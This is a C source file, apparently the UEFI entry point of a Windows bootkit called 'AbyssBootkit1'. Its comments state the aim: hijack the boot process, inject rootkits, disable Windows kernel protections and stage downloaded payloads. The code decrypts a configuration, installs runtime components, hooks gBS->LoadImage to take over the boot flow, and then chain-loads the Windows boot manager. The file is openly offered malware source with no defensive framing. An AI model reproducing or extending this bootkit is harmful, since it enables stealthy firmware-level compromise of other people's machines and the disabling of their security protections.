// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	UEFI Application
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiApplicationEntryPoint.h
// Module entry point library for UEFI Applications.
#include <Library/UefiApplicationEntryPoint.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot1_Setup/Functions/Functions00Setup.h>
#include <Modules/Module2_BootOs0_Booting/Functions/Functions00Booting.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Functions00PatchHookUefi.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Entry point for the Application (https://uefi.org/specs/UEFI/2.11/04_EFI_System_Table.html).
	@details        This function is executed when the UEFI Application is launched during the early boot phase, before the operating system is loaded. It serves as the initial stage of the bootkit and provides a highly privileged execution context within the UEFI firmware, allowing the modification of the boot process by hooking critical functions to retain execution post-boot, injecting rootkits directly into memory, disabling Windows kernel protections, and abusing UEFI services to download, decrypt, and stage payloads prior to OS runtime.


	@param[in]      ImageHandle             The firmware allocated handle for the EFI image. 
	@param[in]      SystemTable             A pointer to the EFI System Table.


	@retval         EFI_SUCCESS             The entry point is executed successfully.
	@retval         other                   Some error occurs when executing this entry point.
**/
EFI_STATUS
EFIAPI
UefiMain(
	IN              EFI_HANDLE              ImageHandle,
	IN              EFI_SYSTEM_TABLE        *SystemTable
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// DEBUG - START
	// *********************************************************************************************************************
	// *********************************************************************************************************************
	// *********************************************************************************************************************



	// ---------------------------------------------------------------------------------------------------------------------
	// QUESTION:
	// DEBUG -> DO YOU WANT TO DEBUG THIS BOOTKIT ???
	// DEBUG -> CHANGE THESE VARIABLES TO TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, L"\\EFI\\Boot\\Debug.txt" (Default: FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, NULL)

	// Debug
	BOOLEAN DebugInfo = FALSE;
	BOOLEAN DebugWarn = FALSE;
	BOOLEAN DebugError = FALSE;
	BOOLEAN DebugCritical = FALSE;

	// Debug Logging
	BOOLEAN LoggingEnabledDebug = FALSE;

	// Console Logging
	BOOLEAN LoggingEnabledConsole = FALSE;

	// File Logging
	BOOLEAN LoggingEnabledFile = FALSE;
	CHAR16 *LoggingFilePath = NULL;



	// ---------------------------------------------------------------------------------------------------------------------
	// BOOTKIT - PRE BOOT CONFIGURATION
	// *********************************************************************************************************************
	// *********************************************************************************************************************
	// *********************************************************************************************************************


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_STATUS DebugStatus;
	UINT8 *DecryptedJsonConfiguration = NULL;
	UINTN DecryptedJsonConfigurationSize = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Set logging
	DebugStatus = PreBootConfiguration_UtilsDebug_SetLogging(DebugInfo, DebugWarn, DebugError, DebugCritical, LoggingEnabledDebug, LoggingEnabledConsole, LoggingEnabledFile, LoggingFilePath);

	// Failed
	if (EFI_ERROR(DebugStatus))
	{
		return DebugStatus;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Get configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_ReadEncryptedConfiguration(&DecryptedJsonConfiguration, &DecryptedJsonConfigurationSize);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootConfiguration_FunctionsConfiguration_ReadEncryptedConfiguration failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize configuration fields
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Initialize configuration fields\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_InitializeConfigurationFields((CHAR8*)DecryptedJsonConfiguration);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootConfiguration_FunctionsConfiguration_InitializeConfigurationFields failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print configuration fields
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Print configuration fields\r\n");

	PreBootConfiguration_FunctionsConfiguration_PrintConfigurationFields((CHAR8*)DecryptedJsonConfiguration);



	// ---------------------------------------------------------------------------------------------------------------------
	// BOOTKIT - PRE BOOT SETUP
	// *********************************************************************************************************************
	// *********************************************************************************************************************
	// *********************************************************************************************************************


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle screen configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Handle screen configuration\r\n");

	Status = PreBootSetup_FunctionsSetup_Screen();

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootSetup_FunctionsSetup_Screen failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle banner configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Handle banner configuration\r\n");

	Status = PreBootSetup_FunctionsSetup_Banner();

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootSetup_FunctionsSetup_Banner failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle UEFI Read/Write NTFS Driver configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Handle UEFI Read/Write NTFS Driver configuration\r\n");

	Status = PreBootSetup_FunctionsSetup_UEFIReadWriteNTFSDriver();

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootSetup_FunctionsSetup_UEFIReadWriteNTFSDriver failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle Additional Component configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Handle Additional Component configuration\r\n");

	Status = PreBootSetup_FunctionsSetup_AdditionalComponentDisk();

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootSetup_FunctionsSetup_AdditionalComponentDisk failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle Runtime-Bootkit configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Handle Runtime-Bootkit configuration\r\n");

	Status = PreBootSetup_FunctionsSetup_BootkitRuntime();

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - PreBootSetup_FunctionsSetup_BootkitRuntime failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}



	// BOOTKIT - PATCH/HOOK/MODIFY WINDOWS BOOT PROCESS
	// *********************************************************************************************************************
	// *********************************************************************************************************************
	// *********************************************************************************************************************


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the BootkitBoot field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Check if the BootkitBoot field is TRUE\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot, L"TRUE") == 0)
	{
		// ---------------------------------------------------------------------------------------------------------------------
		// Hook gBS->LoadImage
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Hooking gBS->LoadImage as the initial step to hijack the boot flow, inject rootkits, and disable OS defenses\r\n");

		Global_BootWindowsHookings_UtilsHooks_BSLoadImageOriginal = (EFI_IMAGE_LOAD)BootWindowsHookings_FunctionsUefi_HookServiceTablePointer(&gBS->Hdr, (VOID**)&gBS->LoadImage, (VOID*)&BootWindowsHookings_FunctionsUefi_HookgBSLoadImage);
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot] not TRUE.\r\n");
	}



	// BOOTKIT - BOOTING
	// *********************************************************************************************************************
	// *********************************************************************************************************************
	// *********************************************************************************************************************



	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	CHAR16* ABYSS_WINDOWS_BOOT_MANAGER_BACKUP_PATH_FILENAME = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";


	// ---------------------------------------------------------------------------------------------------------------------
	// Boot the operating system
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - Boot the operating system\r\n");

	Status = BootOsBooting_FunctionsBooting_LocatesLoadsStartsImage(ABYSS_WINDOWS_BOOT_MANAGER_BACKUP_PATH_FILENAME);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 [UEFIApplication.c] (UefiMain) - BootOsBooting_FunctionsBooting_LocatesLoadsStartsImage failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;

}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
